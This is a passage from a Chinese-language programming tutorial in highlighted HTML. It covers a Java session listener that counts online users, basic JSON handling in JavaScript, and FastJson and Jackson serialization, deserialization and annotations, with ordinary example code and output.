class="comment">// 创建Session监听，一旦创建Session，就会触发这个</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sessionCreated</span><span class="params">(HttpSessionEvent se)</span> </span>&#123;</span><br><span class="line">        ServletContext ctx = se.getSession().getServletContext();</span><br><span class="line">        Integer onlineCount = (Integer) ctx.getAttribute(<span class="string">&quot;OnlineCount&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(onlineCount == <span class="keyword">null</span>)&#123;</span><br><span class="line">            onlineCount = <span class="keyword">new</span> Integer(<span class="number">1</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> count = onlineCount.intValue();</span><br><span class="line">            onlineCount = <span class="keyword">new</span> Integer(count+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.setAttribute(<span class="string">&quot;OnlineCount&quot;</span>,onlineCount);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁Session监听，一旦Session销毁，会触发这个</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sessionDestroyed</span><span class="params">(HttpSessionEvent se)</span> </span>&#123;</span><br><span class="line">        ServletContext ctx = se.getSession().getServletContext();</span><br><span class="line">        Integer onlineCount = (Integer) ctx.getAttribute(<span class="string">&quot;OnlineCount&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(onlineCount == <span class="keyword">null</span>)&#123;</span><br><span class="line">            onlineCount = <span class="keyword">new</span> Integer(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> count = onlineCount.intValue();</span><br><span class="line">            onlineCount = <span class="keyword">new</span> Integer(count-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.setAttribute(<span class="string">&quot;OnlineCount&quot;</span>,onlineCount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web.xml 注册监听器</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>top.v0w.listener.OnlineCountListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x08-JSON"><a href="#0x08-JSON" class="headerlink" title="0x08 JSON"></a>0x08 JSON</h1><h2 id="8-1-简介与简单使用"><a href="#8-1-简介与简单使用" class="headerlink" title="8.1 简介与简单使用"></a>8.1 简介与简单使用</h2><p>JSON JavaScript 对象表示法（JavaScript Object Notation） 是一种存储数据的方式。<br>以键值对的形式进行定义</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> gareen = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;盖伦&quot;</span>,<span class="string">&quot;hp&quot;</span>:<span class="number">616</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;英雄名称: &quot;</span> + gareen.name + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;英雄血量: &quot;</span> + gareen.hp + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>通过方括号[] 创建JSON 数组，可以用类似数组的方式来获取单个对象</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> heros=</span><br><span class="line">[</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;盖伦&quot;</span>,<span class="string">&quot;hp&quot;</span>:<span class="number">616</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;提莫&quot;</span>,<span class="string">&quot;hp&quot;</span>:<span class="number">313</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;死歌&quot;</span>,<span class="string">&quot;hp&quot;</span>:<span class="number">432</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;火女&quot;</span>,<span class="string">&quot;hp&quot;</span>:<span class="number">389</span>&#125;</span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;JSON数组大小&quot;</span>+heros.length);</span><br><span class="line"><span class="built_in">document</span>.write( <span class="string">&quot;第4个英雄是:&quot;</span> +  heros[<span class="number">3</span>].name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>字符串转换成JSON对象</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> s1 = <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;盖伦\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="string">&quot;,\&quot;hp\&quot;:616&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> s3 = s1+s2;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;这是一个JSON格式的字符串:&quot;</span> + s3);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> gareen = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span>+s3+<span class="string">&quot;)&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;这是一个JSON对象: &quot;</span> + gareen);</span><br><span class="line">  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>JSON对象转换成字符串</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> hero = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;盖伦&quot;</span>,<span class="string">&quot;hp&quot;</span>:<span class="string">&quot;616&quot;</span>&#125;;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;这是一个json 对象：&quot;</span>+ hero);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> heroString = <span class="built_in">JSON</span>.stringify(hero)</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;这是一个json 字符串：&quot;</span>+ heroString );</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="8-2-FastJson"><a href="#8-2-FastJson" class="headerlink" title="8.2 FastJson"></a>8.2 FastJson</h2><h3 id="8-2-1-简介"><a href="#8-2-1-简介" class="headerlink" title="8.2.1 简介"></a>8.2.1 简介</h3><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。<br>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。<br>Fastjson 源码地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>Fastjson 中文 Wiki：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p><h3 id="8-2-2-使用"><a href="#8-2-2-使用" class="headerlink" title="8.2.2 使用"></a>8.2.2 使用</h3><p>你可以在 maven 中央仓库中直接下载：<br><a href="http://repo1.maven.org/maven2/com/alibaba/fastjson/">http://repo1.maven.org/maven2/com/alibaba/fastjson/</a><br>或者配置 maven 依赖:</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>x.x.x<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-2-3-将Java对象转换成Json格式字符串（序列化）"><a href="#8-2-3-将Java对象转换成Json格式字符串（序列化）" class="headerlink" title="8.2.3 将Java对象转换成Json格式字符串（序列化）"></a>8.2.3 将Java对象转换成Json格式字符串（序列化）</h3><p>JavaBean Person类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test.v0w;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.annotation.JSONField;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">     </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;AGE&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;FULL NAME&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String fullName;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 这里的注解时factjson的注解，表示这个字段的序列化名称，还可以通过其他字段对filed转换json时进行不同的规定</span></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;DATE OF BIRTH&quot;,format = &quot;yyyy-MM-dd&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date dateOfBirth;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(<span class="keyword">int</span> age, String fullName, Date dateOfBirth)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.fullName= fullName;</span><br><span class="line">        <span class="keyword">this</span>.dateOfBirth = dateOfBirth;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 标准 getters &amp; setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FastJson.java 对Person对象进行序列化，转换成Json字符串</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test.v0w;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fastjson</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;Person&gt; listOfPersons = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        listOfPersons.add(<span class="keyword">new</span> Person(<span class="number">15</span>, <span class="string">&quot;John Doe&quot;</span>, <span class="keyword">new</span> Date()));</span><br><span class="line">        listOfPersons.add(<span class="keyword">new</span> Person(<span class="number">20</span>, <span class="string">&quot;Janette Doe&quot;</span>, <span class="keyword">new</span> Date()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenJavaList_thanConvertToJsonCorrect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String jsonOutput= JSON.toJSONString(listOfPersons);</span><br><span class="line">        System.out.println(jsonOutput);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#123;&quot;AGE&quot;:15,&quot;DATE OF BIRTH&quot;:&quot;2020-12-31&quot;,&quot;FULL NAME&quot;:&quot;John Doe&quot;&#125;,&#123;&quot;AGE&quot;:20,&quot;DATE OF BIRTH&quot;:&quot;2020-12-31&quot;,&quot;FULL NAME&quot;:&quot;Janette Doe&quot;&#125;]</span><br><span class="line"></span><br><span class="line">如果美化一下格式，输出：</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;AGE&quot;: 15, </span><br><span class="line">        &quot;DATE OF BIRTH&quot;: &quot;2020-12-31&quot;, </span><br><span class="line">        &quot;FULL NAME&quot;: &quot;John Doe&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &#123;</span><br><span class="line">        &quot;AGE&quot;: 20, </span><br><span class="line">        &quot;DATE OF BIRTH&quot;: &quot;2020-12-31&quot;, </span><br><span class="line">        &quot;FULL NAME&quot;: &quot;Janette Doe&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>我们可以通过定义不同的注解，指定进行Json序列化时，字段的不同行为：<br>比如自定义输出，控制字段的排序，日期显示格式，序列化标记等。</p><ul><li><p>format 参数用于格式化 date 属性。</p><ul><li><code>@JSONField(format=&quot;yyyyMMdd&quot;)</code></li></ul></li><li><p>默认情况下， FastJson 库可以序列化 Java bean 实体， 但我们可以使用 serialize 指定字段不序列化。</p><ul><li><code>@JSONField(deserialize=false)</code></li><li><code>@JSONField(serialize=false)</code></li></ul></li><li><p>使用 ordinal 参数指定字段的顺序</p><ul><li><code>@JSONField(ordinal = 1) Json序列化后第一个字段</code></li><li><code>@JSONField(ordinal = n) Json序列化后第n个字段</code></li></ul><p>具体可以参见<code>@JSONField</code>注解定义：<br><img src="https://image.v0w.top/2020/12/16093946207289.jpg" alt="reference"></p></li></ul><p><strong>JsonField配置方式</strong><br>FieldInfo 可以配置在 getter/setter 方法或者字段上。也可以直接配置在field字段上.</p><p><strong>FastJson BeanToArray序列化功能</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String jsonOutput= JSON.toJSONString(listOfPersons, SerializerFeature.BeanToArray);</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    [</span><br><span class="line">        15, </span><br><span class="line">        &quot;2020-12-31&quot;, </span><br><span class="line">        &quot;John Doe&quot;</span><br><span class="line">    ], </span><br><span class="line">    [</span><br><span class="line">        20, </span><br><span class="line">        &quot;2020-12-31&quot;, </span><br><span class="line">        &quot;Janette Doe&quot;</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>即直接对字段数据进行序列化，但是并不将其与FieldName对应。</p><h3 id="8-2-4-创建Json对象"><a href="#8-2-4-创建Json对象" class="headerlink" title="8.2.4 创建Json对象"></a>8.2.4 创建Json对象</h3><p>创建 JSON 对象非常简单，只需使用 JSONObject（fastJson提供的json对象） 和 JSONArray（fastJson提供json数组对象） 对象即可。</p><p>我们可以把JSONObject 当成一个 <code>Map&lt;String,Object&gt;</code> 来看，只是 JSONObject 提供了更为丰富便捷的方法，方便我们对于对象属性的操作。我们看一下源码。<br><img src="https://image.v0w.top/2020/12/16093954616523.jpg" alt="reference"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenGenerateJson_thanGenerationCorrect</span><span class="params">()</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">    JSONArray jsonArray = <span class="keyword">new</span> JSONArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        JSONObject jsonObject = <span class="keyword">new</span> JSONObject();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;AGE&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;FULL NAME&quot;</span>, <span class="string">&quot;Doe &quot;</span> + i);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;DATE OF BIRTH&quot;</span>, <span class="string">&quot;2016/12/12 12:12:12&quot;</span>);</span><br><span class="line">        jsonArray.add(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">    String jsonOutput = jsonArray.toJSONString();</span><br><span class="line">    System.out.println(jsonOutput);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-2-5-Json格式字符串解析成Java对象-反序列化"><a href="#8-2-5-Json格式字符串解析成Java对象-反序列化" class="headerlink" title="8.2.5 Json格式字符串解析成Java对象(反序列化)"></a>8.2.5 Json格式字符串解析成Java对象(反序列化)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenJson_thanConvertToObjectCorrect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="number">20</span>, <span class="string">&quot;John Doe&quot;</span>, <span class="keyword">new</span> Date());</span><br><span class="line">        System.out.println(<span class="string">&quot;Old Person: &quot;</span>+ person);</span><br><span class="line">        String jsonObject = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;Json String: &quot;</span>+jsonObject);</span><br><span class="line"></span><br><span class="line">        Person newPerson = JSON.parseObject(jsonObject, Person.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;New Person: &quot;</span>+ newPerson);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        assertEquals(newPerson.getAge(), 20); // 如果我们设置序列化化为 default true</span></span><br><span class="line">        assertEquals(newPerson.getAge(), <span class="number">0</span>); <span class="comment">// 如果我们设置序列化化为 false</span></span><br><span class="line">        assertEquals(newPerson.getFullName(), listOfPersons.get(<span class="number">0</span>).getFullName()); <span class="comment">//assertEquals(expected,actual) 判断两个值是否相等</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>output：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Old Person: Person&#123;age&#x3D;20, fullName&#x3D;&#39;John Doe&#39;, dateOfBirth&#x3D;Thu Dec 31 14:33:25 CST 2020&#125;</span><br><span class="line">Json String: &#123;&quot;DATE OF BIRTH&quot;:&quot;2020-12-31&quot;,&quot;FULL NAME&quot;:&quot;John Doe&quot;&#125;</span><br><span class="line">New Person: Person&#123;age&#x3D;0, fullName&#x3D;&#39;John Doe&#39;, dateOfBirth&#x3D;Thu Dec 31 00:00:00 CST 2020&#125;</span><br></pre></td></tr></table></figure><h2 id="8-3-Jackson"><a href="#8-3-Jackson" class="headerlink" title="8.3 Jackson"></a>8.3 Jackson</h2><h3 id="8-3-1-简介"><a href="#8-3-1-简介" class="headerlink" title="8.3.1 简介"></a>8.3.1 简介</h3><p>Jackson框架是基于Java平台的一套数据处理工具，被称为“最好的Java Json解析器”。<br>Jackson框架包含了3个核心库：core,databind,annotations.<br>Jackson还包含了其它数据处理类库，此外不作说明。</p><ul><li><p>流式API - 读取并将JSON内容写入作为离散事件。 JsonParser读取数据，而JsonGenerator写入数据。它是三者中最有效的方法，是最低的开销和最快的读/写操作。它类似于Stax解析器XML。</p></li><li><p>树模型 - 准备JSON文件在内存里以树形式表示。 ObjectMapper构建JsonNode节点树。这是最灵活的方法。它类似于XML的DOM解析器。</p></li><li><p>数据绑定 - 转换JSON并从POJO（普通Java对象）使用属性访问或使用注释。它有两个类型。</p><ul><li>简单的数据绑定 - 转换JSON和Java Maps, Lists, Strings, Numbers, Booleans 和null 对象。</li><li>全部数据绑定 - 转换为JSON从任何JAVA类型。</li></ul></li><li><p>Jackson Home Page：<a href="https://github.com/FasterXML/jackson">https://github.com/FasterXML/jackson</a></p></li><li><p>Jackson Wiki：<a href="http://wiki.fasterxml.com/JacksonHome">http://wiki.fasterxml.com/JacksonHome</a></p></li><li><p>Jackson doc: <a href="https://github.com/FasterXML/jackson-docs">https://github.com/FasterXML/jackson-docs</a></p></li><li><p>Jackson Download Page：<a href="http://wiki.fasterxml.com/JacksonDownload">http://wiki.fasterxml.com/JacksonDownload</a></p></li><li><p>Jackson Guide Blog: <a href="https://www.baeldung.com/jackson">https://www.baeldung.com/jackson</a></p></li></ul><p>maven pom.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- jackson request jar package --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.11.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.11.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.11.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-3-2-Java-对象转Json字符串"><a href="#8-3-2-Java-对象转Json字符串" class="headerlink" title="8.3.2 Java 对象转Json字符串"></a>8.3.2 Java 对象转Json字符串</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">    Person person = <span class="keyword">new</span> Person(<span class="number">18</span>, <span class="string">&quot;V0WKeep3r&quot;</span>, <span class="keyword">new</span> Date());</span><br><span class="line">    File newFile=  <span class="keyword">new</span> File(<span class="string">&quot;/Users/v0w/Desktop/person.json&quot;</span>);</span><br><span class="line">    <span class="comment">// 序列化</span></span><br><span class="line">    <span class="comment">// 是否可以序列化</span></span><br><span class="line">    System.out.println(mapper.canSerialize(Person.class));</span><br><span class="line">    <span class="comment">// Json 写入文件</span></span><br><span class="line">    mapper.writeValue(newFile, person);</span><br><span class="line">    <span class="comment">// pojo -&gt; Json String</span></span><br><span class="line">    String jsonString = mapper.writeValueAsString(person);</span><br><span class="line">    System.out.println(jsonString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>output:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">true</span><br><span class="line">&#123;&quot;age&quot;:18,&quot;fullName&quot;:&quot;V0WKeep3r&quot;,&quot;dateOfBirth&quot;:1609399813373&#125;</span><br></pre></td></tr></table></figure><p><strong>Jackson注解</strong><br>与fastjson类似，Jackson也可以通过注解的方式对java类的filed进行设置，从而使其在序列化成json字符串时，呈现不同的形式。<br>1、 <code>@JsonPropertyOrder(&#123; &quot;name&quot;, &quot;id&quot; &#125;)</code>注解可以指定不同属性的输出顺序</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JsonPropertyOrder(&#123; &quot;fullName&quot;, &quot;age&quot; , &quot;dateOfBirth&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String fullName;</span><br><span class="line">    <span class="keyword">private</span> Date dateOfBirth;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output</span></span><br><span class="line">&#123;<span class="string">&quot;fullName&quot;</span>:<span class="string">&quot;V0WKeep3r&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>,<span class="string">&quot;dateOfBirth&quot;</span>:<span class="number">1609400550595</span>&#125;</span><br></pre></td></tr></table></figure><p>2、<code>@JsonValue</code>指示库将用于序列化整个实例的单个方法。</p><p>例如，在一个枚举中，我们用@JsonValue注释getName，以便任何这样的实体都通过其名称序列化：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> TypeEnumWithValue &#123;</span><br><span class="line">    TYPE1(<span class="number">1</span>, <span class="string">&quot;Type A&quot;</span>), TYPE2(<span class="number">2</span>, <span class="string">&quot;Type 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// standard constructors</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonValue</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在这是我们的测试：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenSerializingUsingJsonValue_thenCorrect</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> JsonParseException, IOException </span>&#123;</span><br><span class="line"> </span><br><span class="line">    String enumAsString = <span class="keyword">new</span> ObjectMapper()</span><br><span class="line">      .writeValueAsString(TypeEnumWithValue.TYPE1);</span><br><span class="line"></span><br><span class="line">    assertThat(enumAsString, is(<span class="string">&quot;&quot;</span>Type A<span class="string">&quot;&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、**@JsonRootName**<br><code>@JsonRootName</code>注释时，如果包裹被启用，以指定的包装中使用的根目录的名称。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;id&quot;: 1,</span><br><span class="line">    &quot;name&quot;: &quot;John&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它会像这样包装：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;User&quot;: &#123;</span><br><span class="line">        &quot;id&quot;: 1,</span><br><span class="line">        &quot;name&quot;: &quot;John&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，让我们看一个例子。使用<code>@JsonRootName</code>注释，表明这个潜在的包装实体的名称：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@JsonRootName(value &#x3D; &quot;user&quot;)</span><br><span class="line">public class UserWithRoot &#123;</span><br><span class="line">    public int id;</span><br><span class="line">    public String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认情况下，包装器的名称将为类的名称–<code>UserWithRoot</code>。通过使用注释，我们得到了看上去更干净的<code>user</code>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void whenSerializingUsingJsonRootName_thenCorrect()</span><br><span class="line">  throws JsonProcessingException &#123;</span><br><span class="line"></span><br><span class="line">    UserWithRoot user &#x3D; new User(1, &quot;John&quot;);</span><br><span class="line"></span><br><span class="line">    ObjectMapper mapper &#x3D; new ObjectMapper();</span><br><span class="line">    mapper.enable(SerializationFeature.WRAP_ROOT_VALUE);&#x2F;&#x2F;需要开启这个</span><br><span class="line">    String result &#x3D; mapper.writeValueAsString(user);</span><br><span class="line"></span><br><span class="line">    assertThat(result, containsString(&quot;John&quot;));</span><br><span class="line">    assertThat(result, containsString(&quot;user&quot;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;user&quot;:&#123;</span><br><span 